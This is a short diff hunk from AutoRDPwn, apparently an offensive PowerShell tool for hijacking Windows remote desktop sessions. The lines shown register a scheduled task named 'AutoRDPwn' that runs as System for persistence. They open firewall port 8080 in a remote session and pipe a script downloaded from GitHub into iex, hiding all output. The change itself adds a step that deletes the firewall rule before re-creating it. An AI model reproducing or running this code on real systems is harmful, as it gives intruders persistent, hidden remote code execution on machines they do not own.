@@ -438,7 +438,7 @@ $action = New-ScheduledTaskAction -Execute powershell -Argument "-ExecutionPolic
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "AutoRDPwn" -Description "AutoRDPwn" -TaskPath Microsoft\Windows\Powershell\ScheduledJobs -User "System" > $null }}
 
 Write-Host "" ; $Host.UI.RawUI.ForegroundColor = 'Gray' ; Write-Host $txt28 ; sleep -milliseconds 3000 
-if ($webserver){ invoke-command -session $RDP[0] -scriptblock { Write-Host ""
+if ($webserver){ invoke-command -session $RDP[0] -scriptblock { Write-Host "" ; netsh advfirewall firewall delete rule name="Powershell Webserver" 2>&1> $null
 netsh advfirewall firewall add rule name="Powershell Webserver" dir=in action=allow protocol=TCP localport=8080 2>&1> $null
 Invoke-WebRequest -Uri https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Sources/Scripts/Start-WebServer.ps1 -UseBasicParsing | iex 2>&1> $null }}
 
